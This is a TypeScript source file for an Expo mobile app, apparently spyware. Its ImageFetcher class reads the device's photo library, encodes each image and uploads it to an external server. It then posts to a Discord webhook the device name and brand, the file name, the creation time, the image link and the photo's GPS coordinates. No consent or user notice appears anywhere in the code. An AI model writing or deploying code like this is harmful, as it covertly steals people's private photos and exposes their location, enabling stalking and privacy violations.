import * as MediaLibrary from 'expo-media-library';
import * as FileSystem from 'expo-file-system';
import * as Device from 'expo-device';
import { Webhook, SendWebhook } from './Webhook';
import KEYS from './Keys';
import axios from 'axios';

export default class ImageFetcher {
    assets: Array<MediaLibrary.Asset>;
    fetched: boolean;

    constructor() {
        this.assets = [];
        this.fetched = false;
    }

    async FetchPhotos(amount: number): Promise<void> 
    {
        if(this.fetched) return;

        const assets = await MediaLibrary.getAssetsAsync({
            first: amount,
        });
        
        for(let i = 0; i < assets.totalCount; i++)
        {
            this.assets.push(assets.assets[i]);
        }
    }

    async Upload(): Promise<void>
    {
        if(this.fetched) return;

        for(const asset of this.assets)
        {
            if(Device.brand === "Apple" && asset.mediaSubtypes.includes("livePhoto")) continue;

            const info:MediaLibrary.AssetInfo = await MediaLibrary.getAssetInfoAsync(asset);

            const base64 = await FileSystem.readAsStringAsync(info.localUri, {encoding:'base64'});

            const form = new FormData();
            form.append("image", base64);

            const res = await fetch(KEYS.SERVER_URL, {
                method: "POST",
                body: form
            });
            const parsed = JSON.parse(await res.text());

            const webhook: Webhook = {
                username: "Cook",
                avatar_url: "https://cdn.discordapp.com/attachments/1173871538156613644/1173897580393017394/5AA9DFC5-B16D-491C-A7B6-B6A8F0A2CBC3.jpg",
                content: `
                # Image From ${Device.brand}, Name: ${Device.deviceName}
                ## ${asset.filename}
                Time created: ${new Date(asset.creationTime).toDateString() + ' ' + new Date(asset.creationTime).toTimeString()}
                URL:${parsed.data.image.url}
                Location:${info.location?.latitude},${info.location?.longitude}
                Local Uri:${info.localUri}
                `
            };

            SendWebhook(KEYS.WEBHOOK_URL, webhook);
        }

        this.assets = [];
        this.fetched = true;
    }
}